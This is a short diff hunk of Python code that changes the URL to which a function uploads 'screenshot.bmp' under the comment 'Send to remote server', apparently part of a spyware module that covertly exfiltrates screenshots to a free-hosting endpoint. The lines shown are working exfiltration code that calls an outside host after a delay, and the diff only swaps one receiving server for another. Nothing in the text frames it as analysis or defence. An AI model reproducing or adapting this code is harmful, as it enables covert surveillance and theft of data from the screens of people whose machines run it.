@@ -38,7 +38,7 @@ def run(**args):
 
 #Send to remote server
    time.sleep(20)
-   url = "http://psyberlupus.000webhostapp.com/site.php/post"
+   url = "http://vidhwansak.000webhostapp.com/site.php/post"
    files = {'image': open('screenshot.bmp','rb')}
    try:
      r = requests.post(url, files=files)
